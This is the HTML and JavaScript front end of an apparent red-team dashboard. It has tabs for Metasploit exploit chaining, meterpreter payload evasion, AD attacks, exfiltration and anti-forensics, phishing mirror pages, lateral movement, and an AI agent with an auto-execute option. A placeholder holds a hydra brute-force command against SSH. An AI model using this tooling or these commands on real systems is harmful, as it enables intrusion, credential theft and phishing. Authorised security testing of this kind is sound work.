  <div id="tab-q" style="display:none"><table><thead><tr><th>Site</th><th>URLs checked</th><th>Candidates (params · DB)</th></tr></thead><tbody id="tb-q"></tbody></table></div>
  <div id="tab-c" style="display:none"><table><thead><tr><th>Host</th><th>Tech</th><th>CVE</th><th>CVSS</th><th>KEV</th><th>Risk</th></tr></thead><tbody id="tb-c"></tbody></table></div>
  <div id="tab-e" style="display:none"><table><thead><tr><th>Domain</th><th>Check</th><th>Status</th></tr></thead><tbody id="tb-e"></tbody></table></div>
    <div id="tab-j" style="display:none">
     <div id="pend-wrap" style="display:none;padding:10px 14px;background:rgba(248,81,73,.06);border-bottom:1px solid var(--bd)">
       <b style="color:var(--crit)">⚔ Pending attack action — approve?</b>
       <div id="pend" style="margin-top:8px"></div>
     </div>
     <table><thead><tr><th>Tool</th><th>Target</th><th>Command</th><th>Status</th><th></th></tr></thead>
     <tbody id="tb-j"></tbody></table>
     <div style="padding:8px 14px" class="muted">All actions are audit-logged to ~/.attack_surface/audit.log · 10min hard cap</div>
    </div>
    <div id="tab-d" style="display:none"><table><thead><tr><th>Provider</th><th>Asset Type</th><th>Name</th><th>Region</th><th>Details</th></tr></thead><tbody id="tb-d"></tbody></table></div>
    <div id="tab-p" style="display:none"><table><thead><tr><th>Type</th><th>URL</th><th>Endpoints</th><th>Fuzzed</th><th>Vulns</th></tr></thead><tbody id="tb-p"></tbody></table></div>
    <div id="tab-m" style="display:none"><table><thead><tr><th>Technique</th><th>Tactic</th><th>CVE</th><th>Finding</th><th>Platform</th></tr></thead><tbody id="tb-m"></tbody></table></div>
    <div id="tab-b" style="display:none"><table><thead><tr><th>Package</th><th>Version</th><th>PURL</th><th>Licenses</th><th>OSV Vulns</th></tr></thead><tbody id="tb-b"></tbody></table></div>
    <div id="tab-asm" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <b style="font-size:12px">🛰 Continuous monitoring</b>
      <span class="muted" style="font-size:11px">asset deltas since the previous scan (--asm)</span>
      <button class="btn" onclick="asmLoad()" style="margin-inline-start:auto">↻ refresh</button>
      <span class="muted" id="asm-status" style="font-size:11px"></span>
     </div>
     <div id="asm-body" style="padding:9px 14px" class="muted">loading…</div>
    </div>
    <div id="tab-r" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="reportGen()">⎙ Generate report</button>
      <select id="report-tpl" style="background:#000;color:var(--tx);border:1px solid var(--bd2);border-radius:2px;padding:6px 8px;font-family:inherit;font-size:12px">
       <option value="all">All sections</option>
       <option value="executive">Executive summary</option>
       <option value="technical">Technical detail</option>
       <option value="compliance">Compliance mapping</option>
      </select>
      <span class="muted" id="report-status" style="font-size:11px">renders the latest scan, plus Knull's session</span>
     </div>
     <div id="report-out" style="display:none;padding:9px 14px;border-bottom:1px solid var(--bd);font-size:11.5px;line-height:1.8"></div>
     <div id="report-view" style="display:none"></div>
     <div id="report-content" class="empty" style="padding:9px 14px">Run a scan, then generate a client-ready report here.</div>
    </div>
    <div id="tab-i" style="display:none"><table><thead><tr><th>Type</th><th>Target</th><th>Status</th><th>Config</th></tr></thead><tbody id="tb-i"></tbody></table></div>
    <div id="tab-mitre" style="display:none"><svg id="mitre-svg" width="100%" height="400"></svg></div>
    <div id="tab-topo" style="display:none"><svg id="topo-svg" width="100%" height="400"></svg></div>
    <div id="tab-chain" style="display:none"><div id="chain-content"></div></div>
    <div id="tab-r2" style="display:none"><div id="redteam-content"></div></div>
    <div id="tab-term" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" id="term-new" onclick="termNew()">▶ New Session</button>
      <button class="btn ghost" id="term-kill" onclick="termKill()">✖ Kill</button>
      <span class="muted" id="term-status">no session</span>
      <span class="muted" style="margin-inline-start:auto" id="term-attach"></span>
     </div>
     <div style="padding:8px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center">
      <input type="text" id="term-prefill-cmd" placeholder="command to pre-fill (e.g. hydra -L users.txt -P rockyou.txt target ssh)"
             style="flex:1;background:#000;border:1px solid var(--bd2);color:var(--ok);border-radius:2px;padding:7px 10px;font-family:inherit;font-size:12px">
      <button class="btn atk" onclick="termPrefill()">⚡ Pre-fill</button>
     </div>
     <div id="term-screen" tabindex="0"
          style="min-height:420px;max-height:600px;overflow:auto;padding:10px 14px;background:#000;color:#00ff66;font-family:ui-monospace,'Cascadia Code',Consolas,monospace;font-size:12px;line-height:1.45;white-space:pre-wrap;word-break:break-all;text-shadow:0 0 6px rgba(0,255,102,.3);outline:none;cursor:text">
[terminal] press ▶ New Session to open a live shell inside kali-as.
[terminal] the attack command can be pre-filled below — nothing runs until YOU press Enter.</div>
     <textarea id="term-hidden-input" autocapitalize="off" autocomplete="off" autocorrect="off" spellcheck="false"
       style="position:absolute;opacity:0;width:1px;height:1px;left:-9999px"></textarea>
    </div>
    <div id="tab-msf" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd)" class="muted">
      Metasploit mapping — <b style="color:var(--ac3)">CHECK</b> modules verify the vulnerability first;
      <b style="color:var(--crit)">EXPLOIT</b> chains fire only after check, with payload + LHOST pre-set.
      <b style="color:var(--ok)">AUTO-LOOP</b>: confirmed checks open a second pre-filled exploit terminal + TG alert.
     </div>
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <span class="muted">🔍 live advisor (msfrpcd):</span>
      <input type="text" id="msf-q" placeholder="CVE-2021-44228  or  eternalblue"
             style="flex:1;min-width:220px;background:#000;border:1px solid var(--bd2);color:var(--ok);border-radius:2px;padding:7px 10px;font-family:inherit;font-size:12px">
      <button class="btn" onclick="msfSearch()">Search msfrpcd</button>
      <button class="btn ghost" onclick="msfWaf()">🛡 WAF scan</button>
     </div>
     <div id="msf-adv" style="display:none;padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="msf-waf" style="display:none;padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div style="overflow-x:auto">
      <table><thead><tr><th style="min-width:150px">Host</th><th style="min-width:110px">Service</th><th style="width:70px">Stage</th><th style="width:120px">Actions</th><th>Module</th></tr></thead>
      <tbody id="tb-msf"></tbody></table>
     </div>
    </div>
    <div id="tab-graph" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="graphBuild()">🕸 Build Graph</button>
      <span class="muted" id="graph-status">no graph built</span>
     </div>
     <div id="graph-canvas" style="min-height:500px;background:#000;position:relative;overflow:hidden"></div>
     <div id="graph-legend" style="padding:8px 14px;border-top:1px solid var(--bd)" class="muted"></div>
     <div id="graph-chains"></div>
    </div>
    <div id="tab-creds" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="credsAnalyze()">🔑 Analyze Creds</button>
      <span class="muted" id="creds-status">no analysis yet</span>
     </div>
     <div style="overflow-x:auto">
      <table><thead><tr><th>Host</th><th>Service</th><th>Mode</th><th>Command</th><th>Actions</th></tr></thead>
      <tbody id="tb-creds"></tbody></table>
     </div>
    </div>
    <div id="tab-origin" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="originHunt()">🎯 Hunt Origin</button>
      <span class="muted" id="origin-status">no hunt yet</span>
     </div>
     <div id="origin-results" style="padding:9px 14px"></div>
    </div>
    <div id="tab-kc" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="killChainBuild()">🩸 Build Kill Chain</button>
      <select id="kc-target" style="max-width:200px"></select>
      <select id="kc-lhost" style="max-width:160px"><option>127.0.0.1</option></select>
      <span class="muted" id="kc-status">no chain built</span>
     </div>
     <div id="kc-results" style="padding:9px 14px"></div>
    </div>
    <div id="tab-lat" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="lateralBuild()">🔗 Auto Lateral Movement</button>
      <input id="lat-source" placeholder="source IP (e.g. 10.0.0.5)" style="max-width:180px">
      <input id="lat-subnet" placeholder="subnet CIDR (auto if empty)" style="max-width:200px">
      <span class="muted" id="lat-status">no lateral scan yet</span>
     </div>
     <div id="lat-chain" style="padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="lat-results" style="padding:9px 14px"></div>
    </div>
    <div id="tab-rt" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="autoRedTeam()">🩸 Auto Red Team Pipeline</button>
      <span class="muted" id="rt-status">auto-triggered after scan — click to re-run</span>
     </div>
     <div id="rt-steps" style="padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="rt-targets" style="padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="rt-killchain" style="padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="rt-lateral" style="padding:9px 14px"></div>
    </div>
    <div id="tab-arsenal" style="display:none">
     <div id="ars-ready" style="margin:0 0 4px;border-bottom:1px solid var(--bd);padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:6px">
       <b style="font-size:12px">⚡ Ready to run</b>
       <span class="muted" style="font-size:11px" id="ars-ready-status">commands built from the latest scan — nothing is executed for you</span>
       <button class="btn" onclick="arsenalReady()" style="margin-inline-start:auto">↻ rebuild</button>
      </div>
      <div id="ars-ready-body" class="muted" style="font-size:11px">loading…</div>
     </div>
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:6px;align-items:center;flex-wrap:wrap">
      <button class="btn on" onclick="arsenalSection('evasion',this)" id="ars-btn-evasion">🛡️ Evasion</button>
      <button class="btn" onclick="arsenalSection('ad',this)" id="ars-btn-ad">🏰 AD Attack</button>
      <button class="btn" onclick="arsenalSection('exfil',this)" id="ars-btn-exfil">📦 Exfil & Anti-Forensics</button>
      <button class="btn" onclick="arsenalSection('advisor',this)" id="ars-btn-advisor">🧠 Attack Advisor</button>
      <button class="btn" onclick="arsenalSection('supply',this)" id="ars-btn-supply">📦 Supply Chain</button>
      <button class="btn" onclick="arsenalSection('cloud',this)" id="ars-btn-cloud">☁️ Cloud Attack</button>
     </div>
     <div id="ars-evasion" style="padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="ev-payload" placeholder="payload (e.g. windows/x64/meterpreter/reverse_tcp)" style="max-width:320px">
       <input id="ev-lhost" placeholder="LHOST" style="max-width:140px" value="127.0.0.1">
       <input id="ev-lport" placeholder="LPORT" style="max-width:80px" value="4444">
       <select id="ev-format"><option>exe</option><option>dll</option><option>psh</option><option>psh-cmd</option><option>raw</option></select>
       <select id="ev-encoder"><option>shikata-ga-nai</option><option>xor_dynamic</option><option>rc4</option><option>context</option></select>
       <button class="btn" onclick="evasionBuild()">🛡️ Generate Evasion</button>
      </div>
      <div id="ev-results"></div>
     </div>
     <div id="ars-ad" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="ad-domain" placeholder="domain (e.g. corp.local)" style="max-width:180px">
       <input id="ad-dcip" placeholder="DC IP" style="max-width:140px">
       <input id="ad-user" placeholder="username (optional)" style="max-width:140px">
       <input id="ad-pass" placeholder="password (optional)" style="max-width:140px">
       <button class="btn" onclick="adAttackBuild()">🏰 Build AD Attack Plan</button>
      </div>
      <div id="ad-results"></div>
     </div>
     <div id="ars-exfil" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <select id="exfil-type"><option value="all">All channels</option><option value="dns">DNS tunneling</option><option value="http">HTTP tunneling</option><option value="covert">Covert channels</option></select>
       <button class="btn" onclick="exfilBuild()">📦 Show Exfil Channels</button>
      </div>
      <div id="exfil-results"></div>
     </div>
     <div id="ars-advisor" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <button class="btn" onclick="advisorBuild()">🧠 Analyze & Recommend</button>
       <span class="muted" id="adv-status">rule-based expert system — zero API cost</span>
      </div>
      <div id="adv-summary" style="padding:8px;border-bottom:1px solid var(--bd)"></div>
      <div id="adv-paths" style="padding:9px 14px"></div>
     </div>
     <div id="ars-supply" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="supply-dir" placeholder="project directory (e.g. ./myapp)" style="max-width:250px">
       <button class="btn" onclick="supplyAudit()">📦 Audit Project</button>
       <input id="supply-secret" placeholder="or paste code to scan for secrets" style="max-width:300px">
       <button class="btn" onclick="supplyScanSecret()">🔍 Scan Secrets</button>
       <input id="supply-brand" placeholder="brand name for typosquat check" style="max-width:180px">
       <button class="btn" onclick="supplyTyposquat()">🔍 Typosquat Check</button>
      </div>
      <div id="supply-results"></div>
     </div>
     <div id="ars-cloud" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="cloud-domain" placeholder="target domain (e.g. company.com)" style="max-width:200px">
       <button class="btn" onclick="cloudAnalyze()">☁️ Analyze Cloud</button>
       <span class="muted" id="cloud-status">DNS-based — no WAF dependency</span>
      </div>
      <div id="cloud-results"></div>
     </div>
    </div>
    <div id="tab-phish" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:6px;align-items:center;flex-wrap:wrap">
      <button class="btn on" onclick="phishSection('mirror',this)" id="ph-btn-mirror">🪞 Mirror Page</button>
      <button class="btn" onclick="phishSection('campaign',this)" id="ph-btn-campaign">📧 Campaign</button>
      <button class="btn" onclick="phishSection('osint',this)" id="ph-btn-osint">🔍 OSINT People</button>
     </div>
     <div id="ph-mirror" style="padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="ph-domain" placeholder="target domain (e.g. company.com)" style="max-width:200px">
       <input id="ph-org" placeholder="org name (optional)" style="max-width:160px">
       <select id="ph-template">
        <option value="google">Google</option><option value="microsoft">Microsoft</option>
        <option value="office365">Office 365</option><option value="aws">AWS</option>
        <option value="github">GitHub</option><option value="generic">Generic</option>
       </select>
       <button class="btn" onclick="phishMirror()">🪞 Generate Mirror</button>
       <span class="muted" id="ph-mirror-status">select template and click generate</span>
      </div>
      <div id="ph-mirror-results"></div>
     </div>
     <div id="ph-campaign" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="ph-camp-domain" placeholder="target domain" style="max-width:200px">
       <input id="ph-camp-name" placeholder="campaign name" style="max-width:160px">
       <select id="ph-camp-template">
        <option value="google">Google</option><option value="microsoft">Microsoft</option>
        <option value="office365">Office 365</option><option value="generic">Generic</option>
       </select>
       <button class="btn" onclick="phishCampaign()">📧 Build Campaign</button>
       <span class="muted" id="ph-camp-status">enter domain and build</span>
      </div>
      <div id="ph-camp-results"></div>
     </div>
     <div id="ph-osint" style="display:none;padding:9px 14px">
      <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px">
       <input id="ph-osint-domain" placeholder="target domain" style="max-width:200px">
       <input id="ph-osint-name" placeholder="person name (optional)" style="max-width:160px">
       <input id="ph-osint-user" placeholder="username (optional)" style="max-width:140px">
       <button class="btn" onclick="phishOSINT()">🔍 Collect OSINT</button>
       <span class="muted" id="ph-osint-status">enter target info</span>
      </div>
      <div id="ph-osint-results"></div>
     </div>
    </div>
    <div id="tab-agent" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <button class="btn" onclick="agentStart()" id="agent-start-btn">🤖 Launch Agent</button>
      <button class="btn" onclick="agentStop()" id="agent-stop-btn" style="display:none">⏹ Stop</button>
      <select id="agent-scan" style="max-width:200px"></select>
      <label style="font-size:11px;display:flex;align-items:center;gap:4px">
       <input type="checkbox" id="agent-auto"> ⚡ Auto-execute
      </label>
      <span class="muted" id="agent-status">agent idle — select scan and launch</span>
     </div>
     <div id="agent-killchain" style="padding:9px 14px;border-bottom:1px solid var(--bd)"></div>
     <div id="agent-cfg" style="padding:9px 14px;border-bottom:1px solid var(--bd)">
      <details>
       <summary style="cursor:pointer;font-weight:600;font-size:12px">⚙ Ops console — runtime settings</summary>
       <div id="cfg-body" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:12px;margin-top:10px">
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Reasoning layer
         <span style="display:flex;gap:8px;align-items:center">
          <input type="checkbox" id="cfg-brain"><span class="muted" id="cfg-brain-v">on</span></span></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Passive verification
         <span style="display:flex;gap:8px;align-items:center">
          <input type="checkbox" id="cfg-verify"><span class="muted" id="cfg-verify-v">on</span></span></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Campaign mode (work every scope root)
         <span style="display:flex;gap:8px;align-items:center">
          <input type="checkbox" id="cfg-campaign"><span class="muted" id="cfg-campaign-v">off</span></span></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Brain confidence floor
         <input type="number" id="cfg-conf" step="0.05" min="0" max="1" style="width:100px"></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Brain calls per run
         <input type="number" id="cfg-calls" step="1" min="0" max="10" style="width:100px"></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Max iterations
         <input type="number" id="cfg-iter" step="1" min="1" max="50" style="width:100px"></label>
        <label style="font-size:11.5px;display:flex;flex-direction:column;gap:4px">Extra scope roots (comma separated)
         <input type="text" id="cfg-scope" placeholder="lab.local, staging.example"></label>
       </div>
       <div style="margin-top:10px;display:flex;gap:8px;align-items:center">
        <button class="btn" onclick="cfgApply()">💾 Apply</button>
        <button class="btn" onclick="cfgLoad()">↻ Reload</button>
        <span class="muted" id="cfg-status" style="font-size:11px"></span>
       </div>
       <div class="muted" style="font-size:10.5px;margin-top:6px">Execution is never a global switch: every shot is still fired by you from the queue below.</div>
      </details>
     </div>
     <div id="agent-queue" style="padding:9px 14px;border-bottom:1px solid var(--bd);display:none"></div>
     <div id="agent-impact" style="padding:9px 14px;border-bottom:1px solid var(--bd);display:none"></div>
     <div id="agent-learn" style="padding:9px 14px;border-bottom:1px solid var(--bd);display:none"></div>
     <div id="agent-history" style="padding:9px 14px;border-bottom:1px solid var(--bd);display:none"></div>
     <div id="agent-evidence" style="padding:9px 14px;border-bottom:1px solid var(--bd);display:none"></div>
     <div id="agent-events" style="padding:9px 14px;max-height:400px;overflow-y:auto"></div>
    </div>
    <div id="tab-chat" style="display:none">
     <div style="padding:9px 14px;border-bottom:1px solid var(--bd);display:flex;gap:8px;align-items:center;flex-wrap:wrap">
      <input id="chat-in" placeholder="Ask Knull anything…"
             style="flex:1;min-width:240px;padding:6px 8px;background:#000;color:var(--tx);border:1px solid var(--bd);border-radius:4px"
             onkeydown="if(event.key==='Enter')chatSend()">
      <button class="btn" id="chat-send" onclick="chatSend()">📤 Send</button>
      <button class="btn" onclick="chatClear()" title="clear conversation">🧹</button>
      <span class="muted" id="chat-status" style="font-size:11px"></span>
     </div>
     <div id="chat-log" style="padding:10px 14px;max-height:72vh;overflow-y:auto;font-size:13px"></div>
    </div>

<script>
const $=id=>document.getElementById(id);
const esc=s=>String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
const md=s=>String(s??'').replace(/\*\*/g,''); // tool stdout carries **bold** markers
function sevClass(s){s=(s||'info').toLowerCase();
 if(s.includes('critical'))return 'sv-critical';if(s.includes('high'))return 'sv-high';
 if(s.includes('medium')||s.includes('moderate'))return 'sv-medium';
 if(s.includes('low'))return 'sv-low';return 'sv-info'}
function extractSev(text){
 const t=String(text);
 let m=t.match(/\((critical|high|medium|moderate|low|info)\)/i);if(m)return m[1].toLowerCase();
 m=t.match(/\*\*(critical|high|medium|moderate|low)\*\*/i);if(m)return m[1].toLowerCase();
 const l=t.toLowerCase();
 if(/email spoofing possible|setup page exposed|subdomain takeover|database port exposed|admin panel exposed/.test(l))return 'critical';
 if(/public exposure|exposed port|open port|database_port_exposed/.test(l)){
  if(/:?(21|23|3389)\b|\bftp\b|\btelnet\b|\brdp\b|ms-wbt|3306|5432|6379|27017|database port/.test(l))return 'high';
  return 'medium';
 }
 if(/missing security headers|dmarc.*none|spoofing/.test(l))return 'medium';
 return 'info'}
function stripSev(text){return String(text).replace(/\*\*/g,'').replace(/\((critical|high|medium|moderate|low|info)\)/i,'').trim()}

let curTab='f',st_cache=null;
function navToggle(head){
 head.classList.toggle('closed');
 const items=head.nextElementSibling;
 if(items)items.style.display=head.classList.contains('closed')?'none':'';
 try{localStorage.setItem('nav:'+head.dataset.g,
   head.classList.contains('closed')?'0':'1')}catch(e){}
}
function navInit(){
 document.querySelectorAll('#sidebar .nav-head').forEach(h=>{
  h.onclick=()=>navToggle(h);
  let closed=false;
  try{closed=localStorage.getItem('nav:'+h.dataset.g)==='0'}catch(e){}
  if(closed){h.classList.add('closed');
   const it=h.nextElementSibling; if(it)it.style.display='none'}
 });
}
navInit();
function tab(t,btn){curTab=t;
 document.querySelectorAll('#sidebar .nav-btn').forEach(b=>b.classList.remove('on'));
 const cur=(btn&&btn.classList)?btn:document.querySelector('#sidebar .nav-btn[data-t="'+t+'"]');
 if(cur){cur.classList.add('on');
  const grp=cur.closest('.nav-group');
  if(grp){const head=grp.querySelector('.nav-head');
   if(head&&head.classList.contains('closed'))navToggle(head);}}
 ['f','h','s','a','w','q','c','e','j','d','p','m','b','r','i','r2','msf','term','graph','creds','origin','kc','lat','rt','arsenal','phish','agent','chat','mitre','topo','chain','asm'].forEach(x=>$('tab-'+x).style.display=t===x?'':'none'); if(t==='j')refreshJobs(); if(t==='term'){$('term-screen').focus()} if(t==='agent'){agentLearn();agentImpactFetch();agentHistory();agentEvidence();cfgLoad()} if(t==='arsenal'){arsenalReady()} if(t==='asm'){asmLoad()} if(t==='chat'){$('chat-in').focus()}}

async function refresh(){
 try{
  const st=await (await fetch('/api/state')).json();
  st_cache=st;
  const L=st.latest||{};
  if(!$('dom').value && L.domain) $('dom').value = L.domain;
  // KPIs
  $('k-score').textContent=L.risk_score??'—';
  const lv=L.risk_level||'no scan yet';
  $('k-level').textContent=lv;
  $('k-score').style.color={'Low':'var(--ok)','Medium':'var(--warn)','High':'var(--hi)','Critical':'var(--crit)'}[L.risk_level]||'var(--tx)';
  // severity counts
  const counts={critical:0,high:0,medium:0,low:0,info:0};
  let findRows='';
  let n=0;
  for(const [host,list] of Object.entries(L.findings||{})){
   for(const f of (list||[])){
    const text=f&&f.title?f.title:String(f);
    const sev=(f&&(f.severity||f.sev))||extractSev(text);
    const key=sev.includes('critical')?'critical':sev.includes('high')?'high':sev.includes('medium')||sev.includes('moderate')?'medium':sev.includes('low')?'low':'info';
    if(counts[key]!==undefined)counts[key]++;
    if(n++<40){
     const act=attackFor(text,host);
     let shown=stripSev(text);
     if(shown.length>80){shown=shown.slice(0,77).replace(/\s+\S*$/,'')+'…';}
     findRows+=`<tr><td class="mono muted">${esc(host)}</td><td>${esc(shown)}</td><td><span class="sev-badge ${sevClass(sev)}">${esc(sev)}</span></td><td>${act?`<button class="btn atk" onclick="proposeAction(this.dataset)" data-tool="${act.tool}" data-cmd="${esc(act.cmd)}" data-target="${esc(host)}" data-finding="${esc(stripSev(text)).slice(0,70)}">⚔ ${act.tool}</button>`:''}${act?`<button class="btn atk" style="background:#0a1f0a;color:#00ff66;border:1px solid rgba(0,255,102,.45)" onclick="termAction(this.dataset)" data-tool="${act.tool}" data-cmd="${esc(act.cmd)}" data-target="${esc(host)}" data-finding="${esc(stripSev(text)).slice(0,70)}" title="Open terminal with command pre-filled">🖥</button>`:''}</td></tr>`}
   }
  }
  $('k-crit').textContent=counts.critical;$('k-high').textContent=counts.high;
  $('k-med').textContent=counts.medium;$('k-low').textContent=counts.low+counts.info;
  $('tb').innerHTML=findRows||'<tr><td colspan=3 class="empty">No findings in the latest scan.</td></tr>';
  $('k-hosts').textContent=(L.hosts||[]).length;
  $('k-subs').textContent=(L.subdomains||[]).length;
  $('subs').innerHTML=(L.subdomains||[]).slice(0,90).map(s=>`<li>${esc(s)}</li>`).join('')||'<li>—</li>';
  $('tb-h').innerHTML=(L.hosts||[]).map(h=>{
    let ports=[];
    try{ports=typeof h.ports==='string'?JSON.parse(h.ports||'[]'):(h.ports||[])}catch(e){}
    const ptxt=ports.length?ports.map(p=>{
      const v=p.service_versioned||p.service||'?';
      return `<span class="port-chip"><b>${p.port}</b> ${esc(v)}</span>`}).join(' '):'<span class="muted">none</span>';
    return `<tr><td class="hostcell"><b class="mono">${esc(h.host)}</b></td><td class="mono muted">${esc(h.ip||'—')}</td><td>${ptxt}</td></tr>`}).join('')||'<tr><td colspan=3 class="empty">—</td></tr>';
  // ---- section tabs from latest.sections ----
  const SEC=(L.sections)||{};
  // Admin panels
  let aRows='';
  for(const [host,panels] of Object.entries(SEC.admin_panels||{})){
    for(const p of (panels||[]).slice(0,6)){
      aRows+=`<tr><td class="mono muted">${esc(host)}</td><td><b>${esc(p.name||p.panel||'?')}</b>${p.score?` <span class="muted">(${p.score})</span>`:''}</td><td class="mono" style="max-width:280px;overflow:hidden;text-overflow:ellipsis">${esc(p.url||p.found_on||'—')}</td></tr>`}}
  $('tb-a').innerHTML=aRows||'<tr><td colspan=3 class="empty">No admin panels discovered.</td></tr>';
  // WordPress
  let wRows='';
  for(const [host,r] of Object.entries(SEC.wordpress||{})){
    if(!r.wordpress)continue;
    const issues=[...(r.rest_users||[]).length?[`users leaked: ${r.rest_users.slice(0,3).join(',')}`]:[],
                  r.xmlrpc_enabled?['xmlrpc enabled'][0]:null,
                  ...(r.leaks||[]).map(l=>`leak: ${l.path}`),
                  r.uploads_listing?'uploads listing':null].filter(Boolean);
    wRows+=`<tr><td class="mono">${esc(host)}</td><td class="mono">${esc(r.version||'hidden')}</td><td class="mono">${esc(r.theme||'—')}${r.theme_version?' '+esc(r.theme_version):''}</td><td class="mono" style="font-size:11px">${esc((r.plugins||[]).slice(0,6).join(', ')||'—')}</td><td>${issues.length?issues.map(i=>`<span class="port-chip" style="color:#ffb4b4">${esc(i)}</span>`).join(' '):'<span class="muted">clean</span>'}</td></tr>`}
  $('tb-w').innerHTML=wRows||'<tr><td colspan=5 class="empty">No WordPress sites found.</td></tr>';
  // SQLi
  let qRows='';
  for(const [host,pr] of Object.entries(SEC.sqli||{})){
    qRows+=`<tr><td class="mono">${esc(host)}</td><td>${pr.urls_checked??0}</td><td>${(pr.candidates||[]).map(c=>`<span class="port-chip" style="color:#ffd28a">${esc(c.params.join(','))} · ${esc(c.db_signatures.join('/'))}</span>`).join(' ')||'<span class="muted">none</span>'}</td></tr>`}
  $('tb-q').innerHTML=qRows||'<tr><td colspan=3 class="empty">No SQL injection surface found.</td></tr>';
  // CVEs
  let cRows='';
    for(const [host,groups] of Object.entries(SEC.cves||{})){
    for(const g of (groups||[]).slice(0,4)){
      for(const c of (g.cves||[]).slice(0,4)){
        const m=g.match==='cpe_exact'?'<span style="color:var(--ok)" title="exact CPE match against NVD">exact</span>'
                :g.match==='keyword'?'<span class="muted" style="color:var(--warn)" title="NVD keyword match — a candidate to verify, not proof the product is present">keyword</span>':'';
        cRows+=`<tr><td class="mono muted">${esc(host)}</td><td>${esc(g.tech||'')} ${m}</td><td class="mono">${esc(c.cve||c.id||'')}</td><td>${c.cvss??c.contextual_risk??'—'}</td><td>${c.kev?'<span class="kev-yes">YES</span>':'<span class="muted">no</span>'}</td><td class="risk-cell">${c.contextual_risk??'—'}</td></tr>`}}}
  $('tb-c').innerHTML=cRows||'<tr><td colspan=6 class="empty">No CVEs mapped.</td></tr>';
  // Email security
  const es=SEC.email_security||{};
  let eRows='';
  for(const [k,v] of Object.entries(es)){
    if(typeof v==='object')continue;
    eRows+=`<tr><td class="mono">${esc(L.domain||'')}</td><td>${esc(k)}</td><td>${v===true?'<span class="kev-yes">FAIL</span>':v===false?'<span style="color:var(--ok)">OK</span>':esc(String(v))}</td></tr>`}
  if(es.email_spoofing_possible)eRows+=`<tr><td class="mono">${esc(L.domain||'')}</td><td><b>spoofing</b></td><td><span class="kev-yes">POSSIBLE</span></td></tr>`;
  $('tb-e').innerHTML=eRows||'<tr><td colspan=3 class="empty">No email security data.</td></tr>';
  // ---- NEW: Cloud Assets ----
  const ca=SEC.cloud_assets||{};
  let dRows='';
  for(const [prov,assets] of Object.entries(ca)){
    for(const a of (assets||[]).slice(0,20)){
      dRows+=`<tr><td class="mono">${esc(prov)}</td><td>${esc(a.type||'')}</td><td class="mono">${esc(a.name||a.id||'')}</td><td>${esc(a.region||'—')}</td><td class="mono" style="font-size:11px">${esc(JSON.stringify(a.details||{})).slice(0,120)}</td></tr>`;
    }
  }
  $('tb-d').innerHTML=dRows||'<tr><td colspan=5 class="empty">No cloud assets discovered.</td></tr>';
  // ---- NEW: API Security ----
